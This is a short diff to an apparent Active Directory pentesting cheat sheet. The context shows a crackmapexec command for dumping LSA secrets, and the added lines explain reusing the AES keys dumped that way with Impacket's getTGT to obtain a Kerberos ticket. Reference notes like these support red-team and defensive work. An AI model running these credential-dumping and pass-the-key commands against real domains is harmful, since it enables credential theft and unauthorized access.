@@ -56,6 +56,11 @@ Dump LSA secrets :
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
 ```
+Many possibilites here, if you get passwords or NTLM hashes, you know what to do. There's others possibilites too, like authenticating with AES keys (you can use 256 or 128 bits keys). You can get it by dumping LSA secrets. Once you get one, you can use the AES keys with Impacket to do whatever you want, and also get a TGT :
+```bash
+impacket-getTGT domain.local/username -aesKey AES_KEY -dc-ip DC_IP
+```
+
 ### DonPAPI
 Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
 ```bash
